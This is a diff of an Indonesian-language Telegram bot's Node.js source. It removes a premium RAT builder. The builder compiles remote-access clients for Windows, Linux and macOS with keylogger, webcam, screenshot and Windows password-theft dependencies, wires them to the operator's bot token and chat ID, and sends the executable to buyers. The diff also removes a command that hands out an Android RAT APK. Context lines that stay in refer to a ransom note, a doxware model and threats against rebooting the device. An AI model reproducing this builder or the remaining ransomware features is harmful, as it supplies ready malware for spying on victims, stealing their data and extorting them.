@@ -6,7 +6,6 @@ const axios = require('axios');
 const config = require("./config");
 const User = require('./models/user');
 const Product = require('./models/product');
-const Rat = require('./models/rat');
 const Category = require('./models/category');
 const Transaction = require('./models/transaction');
 const Userbot = require('./models/userbot');
@@ -17,13 +16,10 @@ const crypto = require('crypto');
 const TrackedLink = require('./models/trackedLink');
 const QRCode = require('qrcode');
 const Jimp = require('jimp');
-const { createInlineKeyboard, isAdmin, sendStartMessage, showProductDetail, sendAwanStartMessage } = require('./utils');
-const { handleYoutubeTools, handleYoutubeMessage, userStates: youtubeUserStates } = require('./commands/youtube');
-const awanPremiumHandler = require('./commands/awan_premium');
+const { createInlineKeyboard, isAdmin, sendStartMessage, showProductDetail } = require('./utils');
 const DoxwareSimulation = require('./models/doxwareSimulation');
 const natural = require('natural');
 const { sendAkun } = require('./unchek');
-const { getWhatsAppPairingCode } = require('./whatsapp');
 
 const bot = new TelegramBot(config.botToken, { polling: true });
 
@@ -130,138 +126,7 @@ bot.on("message", async (msg) => {
     const userId = msg.from.id;
     const text = msg.text;
 
-    if (youtubeUserStates[chatId]) {
-        handleYoutubeMessage(bot, msg);
-        return;
-    }
-
     const state = userStates[chatId];
-
-    // --- Feedback Conversation State Machine ---
-    if (state && state.action === 'awaiting_feedback') {
-        const feedbackText = text;
-        const userId = msg.from.id;
-        const username = msg.from.username ? `@${msg.from.username}` : (msg.from.first_name || 'Pengguna');
-
-        try {
-            const Feedback = require('./models/feedback');
-            const newFeedback = new Feedback({ userId, username, feedbackText });
-            await newFeedback.save();
-
-            bot.sendMessage(chatId, '✅ **Terima kasih!**\n\nMasukan Anda telah kami terima dan akan sangat membantu kami untuk berkembang menjadi lebih baik lagi. ✨');
-
-            const adminNotification = `
-- - - - - - - - - - - - - -
-📮 **FEEDBACK BARU** 📮
-- - - - - - - - - - - - - -
-👤 **Dari:**
-   - **User:** ${username}
-   - **ID:** \`${userId}\`
-
-💬 **Pesan:**
-${feedbackText}
-- - - - - - - - - - - - - -
-`;
-            const keyboard = createInlineKeyboard([
-                { text: '✍️ Balas Pesan Ini', callback_data: `admin_reply_to_feedback_${userId}` }
-            ]);
-            bot.sendMessage(config.adminId, adminNotification, { parse_mode: 'Markdown', reply_markup: keyboard });
-
-        } catch (error) {
-            console.error("Gagal menyimpan feedback:", error);
-            bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat menyimpan masukan Anda. Silakan coba lagi nanti.');
-        } finally {
-            delete userStates[chatId];
-        }
-        return;
-    }
-
-    if (state && state.action === 'awaiting_admin_reply') {
-        const adminReplyText = text;
-        const targetUserId = state.targetUserId;
-
-        const userMessage = `
-- - - - - - - - - - - - - -
-📬 **BALASAN DARI ADMIN** 📬
-- - - - - - - - - - - - - -
-Halo! Admin telah membalas feedback yang Anda kirimkan.
-
-💬 **Pesan Balasan:**
-${adminReplyText}
-- - - - - - - - - - - - - -
-`;
-        const keyboard = createInlineKeyboard([
-            { text: '✍️ Balas ke Admin', callback_data: `user_reply_to_admin` }
-        ]);
-
-        try {
-            await bot.sendMessage(targetUserId, userMessage, { parse_mode: 'Markdown', reply_markup: keyboard });
-            bot.sendMessage(chatId, `✅ Balasan Anda telah berhasil dikirim ke pengguna ID: ${targetUserId}.`);
-        } catch (error) {
-            console.error(`Gagal mengirim balasan ke user ${targetUserId}:`, error);
-            bot.sendMessage(chatId, `❌ Gagal mengirim balasan. Mungkin pengguna telah memblokir bot.`);
-        } finally {
-            delete userStates[chatId];
-        }
-        return;
-    }
-
-    if (state && state.action === 'awaiting_user_reply') {
-        const userReplyText = text;
-        const adminId = config.adminId;
-        const username = msg.from.username ? `@${msg.from.username}` : (msg.from.first_name || 'Pengguna');
-
-        const adminNotification = `
-- - - - - - - - - - - - - -
-↩️ **BALASAN FEEDBACK DARI PENGGUNA** ↩️
-- - - - - - - - - - - - - -
-👤 **Dari:**
-   - **User:** ${username}
-   - **ID:** \`${chatId}\`
-
-💬 **Pesan:**
-${userReplyText}
-- - - - - - - - - - - - - -
-`;
-        const keyboard = createInlineKeyboard([
-            { text: '✍️ Balas Lagi', callback_data: `admin_reply_to_feedback_${chatId}` }
-        ]);
-
-        try {
-            await bot.sendMessage(adminId, adminNotification, { parse_mode: 'Markdown', reply_markup: keyboard });
-            bot.sendMessage(chatId, `✅ Pesan balasan Anda telah terkirim ke Admin.`);
-        } catch (error) {
-            console.error(`Gagal mengirim balasan ke admin:`, error);
-            bot.sendMessage(chatId, `❌ Gagal mengirim balasan ke admin.`);
-        } finally {
-            delete userStates[chatId];
-        }
-        return;
-    }
-
-    // --- WhatsApp Pairing State Machine ---
-    if (state && state.action === 'awaiting_whatsapp_phone') {
-        const phoneNumber = text.trim();
-        if (!/^[62]\d{9,15}$/.test(phoneNumber)) {
-            return bot.sendMessage(chatId, "Format nomor telepon tidak valid. Harap gunakan format '62' diikuti dengan nomor Anda (contoh: 628123456789).");
-        }
-
-        try {
-            await bot.sendMessage(chatId, "⏳ Meminta kode pairing untuk nomor Anda... Mohon tunggu, ini mungkin memerlukan waktu hingga 30 detik.");
-
-            const pairingCode = await getWhatsAppPairingCode(phoneNumber);
-
-            await bot.sendMessage(chatId, `✅ Berhasil! Kode pairing WhatsApp Anda adalah:\n\n*${pairingCode}*\n\nMasukkan kode ini di perangkat WhatsApp Anda untuk menautkan bot.`, { parse_mode: 'Markdown' });
-
-        } catch (error) {
-            console.error(`Gagal mendapatkan kode pairing untuk ${phoneNumber}:`, error);
-            await bot.sendMessage(chatId, `❌ Gagal mendapatkan kode pairing. Terjadi kesalahan: ${error.message}`);
-        } finally {
-            // Hapus state setelah selesai atau gagal
-            delete userStates[chatId];
-        }
-        return; // Hentikan pemrosesan lebih lanjut
-    }
 
     // --- Userbot Login State Machine ---
     if (state && state.action === 'userbot_awaiting_phone') {
@@ -378,10 +243,6 @@ ${userReplyText}
             state.data.age = age;
 
             try {
-                if (isNaN(parseInt(chatId))) {
-                    console.error(`Attempted to register with invalid, non-numeric chatId: ${chatId}`);
-                    return bot.sendMessage(chatId, "Gagal mendaftar: ID Obrolan tidak valid.");
-                }
                 const newUser = new User({
                     chatId: chatId,
                     email: state.data.email,
@@ -645,41 +506,20 @@ ${ransomNote}
             const startPayload = args;
 
             try {
-                let user = await User.findOne({ chatId });
+                const user = await User.findOne({ chatId });
 
-                // Jika pengguna tidak ada, buat pengguna baru secara otomatis
+                // Jika pengguna tidak ada, mulai alur pendaftaran
                 if (!user) {
-                    console.log(`Pengguna baru dengan ID: ${chatId}. Mendaftarkan secara otomatis...`);
-                    user = new User({
-                        chatId: chatId,
-                        username: msg.from.username,
-                        type: msg.chat.type,
-                        joinDate: moment().format(),
-                        daftar: true // Langsung set `daftar` ke true
-                    });
-                    await user.save();
-                    await bot.sendMessage(chatId, `👋 Selamat datang, @${msg.from.username}! Akun Anda telah dibuat secara otomatis.`);
+                    userStates[chatId] = { action: 'awaiting_registration_email', data: {} };
+                    await bot.sendMessage(chatId, "👋 Selamat datang! Sepertinya Anda pengguna baru. Mari kita daftar.\n\nSilakan masukkan alamat email Anda:");
                 } else {
-                    // Opsional: Perbarui username jika berubah
-                    if (msg.from.username && user.username !== msg.from.username) {
-                        user.username = msg.from.username;
-                        await user.save();
-                    }
-                }
-
-                // Logika penanganan payload start
-                if (startPayload === 'awan') {
-                    if (user.isPremium) {
-                        sendAwanStartMessage(bot, chatId);
+                    // Jika pengguna sudah ada
+                    if (startPayload) {
+                        showProductDetail(bot, chatId, startPayload);
                     } else {
-                        bot.sendMessage(chatId, "Fitur 'awan' hanya untuk pengguna premium.");
+                        sendStartMessage(bot, chatId, isAdmin(userId), false, user.isPremium);
                     }
-                } else if (startPayload) {
-                    showProductDetail(bot, chatId, startPayload);
-                } else {
-                    sendStartMessage(bot, chatId, isAdmin(userId), false, user.isPremium);
                 }
-
             } catch (error) {
                 console.error("Gagal menangani /start:", error);
                 bot.sendMessage(chatId, "Terjadi kesalahan saat memproses perintah.");
@@ -774,28 +614,6 @@ ${ransomNote}
         }
     }
 
-    if (text && text.startsWith('/ambilapk')) {
-        const user = await User.findOne({ chatId });
-        if (!user || !user.isPremium) {
-            return bot.sendMessage(chatId, "Maaf, perintah ini hanya untuk pengguna Premium.");
-        }
-
-        const apkPath = path.join(__dirname, 'android_rat_source', 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
-
-        try {
-            if (fs.existsSync(apkPath)) {
-                await bot.sendMessage(chatId, "✅ File APK ditemukan! Mengirim file...");
-                await bot.sendDocument(chatId, apkPath, {}, { caption: "Berikut adalah file app-debug.apk yang telah dibuat." });
-            } else {
-                await bot.sendMessage(chatId, "❌ Gagal! File app-debug.apk tidak dapat ditemukan. Pastikan build telah berhasil dijalankan terlebih dahulu.");
-            }
-        } catch (error) {
-            console.error("Gagal mengirim APK:", error);
-            await bot.sendMessage(chatId, `❌ Terjadi kesalahan saat mengirim file APK: ${error.message}`);
-        }
-        return;
-    }
-
     // Other message handlers
     if (mutedUsers[chatId] && mutedUsers[chatId][userId]) {
         bot.deleteMessage(chatId, msg.message_id);
@@ -814,6 +632,19 @@ ${ransomNote}
         bot.sendMessage(chatId, `Pesan dari ${msg.from.first_name} dihapus karena mengandung kata-kata yang tidak pantas.`);
         return;
     }
+
+    if (newGroupMembers[chatId] && newGroupMembers[chatId][userId]) {
+        const recaptchaCode = newGroupMembers[chatId][userId];
+        if (parseInt(text) === recaptchaCode) {
+            delete newGroupMembers[chatId][userId];
+            bot.sendMessage(chatId, `Selamat, Anda telah lolos verifikasi!`);
+        } else {
+            bot.kickChatMember(chatId, userId);
+            bot.sendMessage(chatId, `Kode reCAPTCHA salah. Anda dikeluarkan dari grup.`);
+        }
+        return;
+    }
+});
 
 bot.onText(/\/setwelcome (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
@@ -872,13 +703,7 @@ bot.on("callback_query", async (query) => {
   const data = query.data;
 
   try {
-    if (data === "youtube_tools") handleYoutubeTools(bot, chatId);
-    else if (data === "connect_whatsapp") {
-        userStates[chatId] = { action: 'awaiting_whatsapp_phone' };
-        bot.sendMessage(chatId, "Silakan masukkan nomor WhatsApp Anda dengan awalan '62' (contoh: 628123456789).");
-        bot.answerCallbackQuery(query.id);
-    }
-    else if (data === "product") showCategories(chatId);
+    if (data === "product") showCategories(chatId);
     else if (data === "register") registerUser(chatId, userId);
     else if (data === "profile") showUserProfile(chatId, userId);
     else if (data.startsWith("category_")) {
@@ -1002,137 +827,6 @@ bot.on("callback_query", async (query) => {
             console.error("Gagal menghapus premium pengguna:", error);
             await bot.answerCallbackQuery(query.id, { text: 'Terjadi kesalahan.', show_alert: true });
         }
-    }
-    else if (data === 'awan_generate_desktop_rat') {
-        bot.answerCallbackQuery(query.id);
-        const user = await User.findOne({ chatId });
-        if (!user || !user.isPremium) {
-            return bot.sendMessage(chatId, "Fitur ini hanya untuk pengguna premium.");
-        }
-
-        userStates[chatId] = { action: 'awaiting_rat_platform', data: {} };
-
-        const platformMessage = "🤖 **Pembuatan RAT Interaktif**\n\nLangkah 1: Pilih platform target untuk RAT Anda.";
-        const platformButtons = [
-            { text: "🖥️ Windows", callback_data: "rat_platform_windows" },
-            { text: "🐧 Linux", callback_data: "rat_platform_linux" },
-            { text: "🍏 macOS", callback_data: "rat_platform_macos" },
-            { text: "⬅️ Batal", callback_data: "awan_premium_menu" }
-        ];
-
-        await bot.editMessageText(platformMessage, {
-            chat_id: chatId,
-            message_id: query.message.message_id,
-            reply_markup: createInlineKeyboard(platformButtons)
-        });
-    }
-    else if (data.startsWith('rat_platform_')) {
-        const platform = data.split('_')[2];
-        const state = userStates[chatId] || { action: 'awaiting_rat_platform', data: {} };
-        if (state.action !== 'awaiting_rat_platform') {
-            return bot.answerCallbackQuery(query.id, { text: 'Sesi tidak valid atau telah kedaluwarsa.', show_alert: true });
-        }
-
-        bot.answerCallbackQuery(query.id);
-        // Hapus pesan menu sebelumnya
-        bot.deleteMessage(chatId, query.message.message_id).catch(e => console.error("Gagal menghapus pesan:", e));
-
-        const generatingMessage = await bot.sendMessage(chatId, "⏳ Memulai proses pembuatan executable... Ini mungkin memakan waktu beberapa menit.");
-
-        const tempDir = path.join(__dirname, 'temp', `rat_${chatId}_${Date.now()}`);
-        let outputExePath;
-        let pkgTarget;
-
-        if (platform === 'windows') {
-            outputExePath = path.join(tempDir, 'rat_client.exe');
-            pkgTarget = 'node16-win-x64';
-        } else if (platform === 'linux') {
-            outputExePath = path.join(tempDir, 'rat_client-linux');
-            pkgTarget = 'node16-linux-x64';
-        } else if (platform === 'macos') {
-            outputExePath = path.join(tempDir, 'rat_client-macos');
-            pkgTarget = 'node16-macos-x64';
-        } else {
-            return bot.sendMessage(chatId, "Platform tidak valid.");
-        }
-
-        const tempScriptPath = path.join(tempDir, 'rat_client.js');
-        const tempPackageJsonPath = path.join(tempDir, 'package.json');
-
-        try {
-            fs.mkdirSync(tempDir, { recursive: true });
-
-            const baseDependencies = {
-                "node-telegram-bot-api": "^0.61.0",
-                "axios": "^1.10.0",
-                "screenshot-desktop": "^1.15.0",
-                "sqlite3": "^5.1.7",
-                "node-keylogger": "0.0.1",
-                "node-webcam": "^0.8.2"
-            };
-
-            if (platform === 'windows') {
-                baseDependencies['win-dpapi'] = '1.1.0';
-            }
-
-            const ratPackageJson = {
-                name: 'rat-client',
-                version: '1.0.0',
-                main: 'rat_client.js',
-                dependencies: baseDependencies
-            };
-            fs.writeFileSync(tempPackageJsonPath, JSON.stringify(ratPackageJson, null, 2));
-
-            let template = fs.readFileSync(path.join(__dirname, 'rat_client_template.js'), 'utf8');
-
-            if (platform !== 'windows') {
-                // Hapus fitur yang hanya untuk Windows
-                template = template.replace(/\/\/ -- START_FEATURE_PASSWORDS --[\s\S]*?\/\/ -- END_FEATURE_PASSWORDS --/g, '');
-            }
-
-            const finalScript = template
-                .replace('%%BOT_TOKEN%%', config.botToken)
-                .replace('%%CHAT_ID%%', config.adminId);
-            fs.writeFileSync(tempScriptPath, finalScript);
-
-            await bot.editMessageText("... (1/4) Menginstal dependensi...", { chat_id: chatId, message_id: generatingMessage.message_id });
-
-            await new Promise((resolve, reject) => {
-                 exec(`npm install`, { cwd: tempDir }, (error, stdout, stderr) => {
-                    if (error) { reject(new Error('Gagal menginstal dependensi.')); return; }
-                    resolve(stdout);
-                });
-            });
-
-            await bot.editMessageText("... (2/4) Mengkompilasi executable...", { chat_id: chatId, message_id: generatingMessage.message_id });
-
-            const pkgPath = path.join(__dirname, 'node_modules', '.bin', 'pkg');
-            await new Promise((resolve, reject) => {
-                exec(`${pkgPath} . --targets ${pkgTarget} --output ${outputExePath}`, { cwd: tempDir }, (error, stdout, stderr) => {
-                    if (error) { reject(new Error('Gagal mengkompilasi executable.')); return; }
-                    resolve(stdout);
-                });
-            });
-
-            await bot.editMessageText("... (3/4) Mengirim file...", { chat_id: chatId, message_id: generatingMessage.message_id });
-
-            await bot.sendDocument(chatId, outputExePath, {}, { caption: `✅ Berhasil! Berikut adalah RAT client Anda untuk ${platform}.` });
-            await bot.deleteMessage(chatId, generatingMessage.message_id);
-
-        } catch (e) {
-            await bot.editMessageText(`❌ Terjadi kesalahan: ${e.message}`, { chat_id: chatId, message_id: generatingMessage.message_id });
-        } finally {
-            if (fs.existsSync(tempDir)) {
-                fs.rmSync(tempDir, { recursive: true, force: true });
-            }
-        }
-    }
-    else if (data.startsWith('awan_android_')) {
-        const command = data.replace('awan_android_', '');
-        bot.answerCallbackQuery(query.id, { text: `Perintah '${command}' adalah stub. Perlu implementasi di sisi client Android.`, show_alert: true });
-    }
-    else if (data.startsWith("awan_") || data === 'awan_premium_menu') {
-        awanPremiumHandler.execute(bot, query);
     }
     else if (data === "unchek_menu") {
         const user = await User.findOne({ chatId: userId });
@@ -1309,26 +1003,43 @@ Jangan coba-coba mematikan atau me-reboot perangkat Anda, karena ini dapat menye
     else if (data === "download_menu") showDownloadMenu(chatId);
     else if (data === "tiktok_v2") handleTikTokV2(chatId);
     else if (data === "twitter") handleTwitter(chatId);
-    else if (data === 'give_feedback') {
-        userStates[chatId] = { action: 'awaiting_feedback' };
-        bot.sendMessage(chatId, '📝 Silakan ketik dan kirimkan masukan Anda untuk bot ini. Admin akan meninjaunya sesegera mungkin.');
-        bot.answerCallbackQuery(query.id);
-    }
-    else if (data.startsWith("admin_reply_to_feedback_")) {
-        const targetUserId = data.split("_")[4];
+    else if (data.startsWith("reply_feedback_")) {
+      const targetUserId = data.split("_")[2];
 
-        if (userId.toString() !== config.adminId) {
-            return bot.answerCallbackQuery(query.id, { text: 'Anda tidak diizinkan untuk melakukan tindakan ini.', show_alert: true });
-        }
+      if (userId.toString() !== config.adminId) {
+          return bot.answerCallbackQuery(query.id, { text: 'Anda tidak diizinkan untuk melakukan tindakan ini.', show_alert: true });
+      }
 
-        userStates[chatId] = { action: 'awaiting_admin_reply', targetUserId: targetUserId };
-        bot.sendMessage(chatId, `✍️ Silakan ketik balasan Anda untuk pengguna dengan ID: ${targetUserId}`);
-        bot.answerCallbackQuery(query.id);
-    }
-    else if (data === 'user_reply_to_admin') {
-        userStates[chatId] = { action: 'awaiting_user_reply' };
-        bot.sendMessage(chatId, '✍️ Silakan ketik balasan Anda untuk Admin.');
-        bot.answerCallbackQuery(query.id);
+      bot.sendMessage(chatId, `✍️ Silakan ketik balasan Anda untuk pengguna dengan ID: ${targetUserId}`);
+
+      bot.once('message', async (replyMsg) => {
+          if (replyMsg.from.id.toString() !== config.adminId) {
+              return;
+          }
+
+          const replyText = replyMsg.text;
+
+          const userMessage = `
+- - - - - - - - - - - - - -
+📬 **BALASAN DARI ADMIN** 📬
+- - - - - - - - - - - - - -
+Halo! Admin telah membalas feedback yang Anda kirimkan.
+
+💬 **Pesan Balasan:**
+${replyText}
+
+- - - - - - - - - - - - - -
+Terima kasih telah memberikan masukan!
+`;
+
+          try {
+              await bot.sendMessage(targetUserId, userMessage, { parse_mode: 'Markdown' });
+              bot.sendMessage(chatId, `✅ Balasan Anda telah berhasil dikirim ke pengguna ID: ${targetUserId}.`);
+          } catch (error) {
+              console.error(`Gagal mengirim balasan ke user ${targetUserId}:`, error);
+              bot.sendMessage(chatId, `❌ Gagal mengirim balasan. Mungkin pengguna telah memblokir bot.`);
+          }
+      });
     }
     bot.answerCallbackQuery(query.id);
   } catch (error) {
@@ -1951,37 +1662,15 @@ bot.onText(/\/broadcast( .*)?/, async (msg, match) => {
       return bot.sendMessage(chatId, "Tidak ada pengguna untuk target ini.");
     }
 
+    const formattedMessage = `||${broadcastMessage}||`;
+    const sentMessage = await bot.sendMessage(chatId, `\`\`\`${formattedMessage}\`\`\``, { parse_mode: "Markdown" });
+
     let successCount = 0;
     let failureCount = 0;
 
-    // Cek apakah ada link di dalam pesan broadcast
-    const urlRegex = /(https?:\/\/[^\s]+)/g;
-    const foundUrls = broadcastMessage.match(urlRegex);
-
-    let options = {
-        parse_mode: 'Markdown'
-    };
-
-    if (foundUrls && foundUrls.length > 0) {
-        // Ambil URL pertama yang ditemukan
-        const url = foundUrls[0];
-        const keyboard = {
-            inline_keyboard: [
-                [
-                    {
-                        text: 'Masuk ke Link',
-                        url: url
-                    }
-                ]
-            ]
-        };
-        options.reply_markup = keyboard;
-    }
-
     for (const user of users) {
         try {
-            // Kirim pesan langsung ke setiap pengguna, bukan forward
-            await bot.sendMessage(user.chatId, broadcastMessage, options);
+            await bot.forwardMessage(user.chatId, chatId, sentMessage.message_id);
             successCount++;
         } catch (error) {
             failureCount++;
@@ -2584,6 +2273,68 @@ async function handleConfess(chatId) {
   });
 }
 
+// Feedback Command
+bot.onText(/\/feedback/, (msg) => {
+    const chatId = msg.chat.id;
+
+    bot.sendMessage(chatId, '📝 Silakan ketik dan kirimkan masukan Anda untuk bot ini. Admin akan meninjaunya sesegera mungkin.');
+
+    bot.once('message', async (feedbackMsg) => {
+        if (feedbackMsg.chat.id !== chatId || (feedbackMsg.text && feedbackMsg.text.startsWith('/'))) {
+            return;
+        }
+
+        const feedbackText = feedbackMsg.text;
+        const userId = feedbackMsg.from.id;
+        const username = feedbackMsg.from.username ? `@${feedbackMsg.from.username}` : (feedbackMsg.from.first_name || 'Pengguna');
+
+        try {
+            const Feedback = require('./models/feedback'); // Moved require here
+            const newFeedback = new Feedback({
+                userId,
+                username,
+                feedbackText
+            });
+
+            await newFeedback.save();
+
+            bot.sendMessage(chatId, '✅ **Terima kasih!**\n\nMasukan Anda telah kami terima dan akan sangat membantu kami untuk berkembang menjadi lebih baik lagi. ✨');
+
+            const adminNotification = `
+- - - - - - - - - - - - - -
+📮 **FEEDBACK BARU** 📮
+- - - - - - - - - - - - - -
+👤 **Dari:**
+   - **User:** ${username}
+   - **ID:** \`${userId}\`
+
+💬 **Pesan:**
+${feedbackText}
+- - - - - - - - - - - - - -
+`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        {
+                            text: '✍️ Balas Pesan Ini',
+                            callback_data: `reply_feedback_${userId}`
+                        }
+                    ]
+                ]
+            };
+
+            bot.sendMessage(config.adminId, adminNotification, {
+                parse_mode: 'Markdown',
+                reply_markup: keyboard
+            });
+
+        } catch (error) {
+            console.error("Gagal menyimpan feedback:", error);
+            bot.sendMessage(chatId, 'Maaf, terjadi kesalahan saat menyimpan masukan Anda. Silakan coba lagi nanti.');
+        }
+    });
+});
 
 const classifier = new natural.BayesClassifier();
 
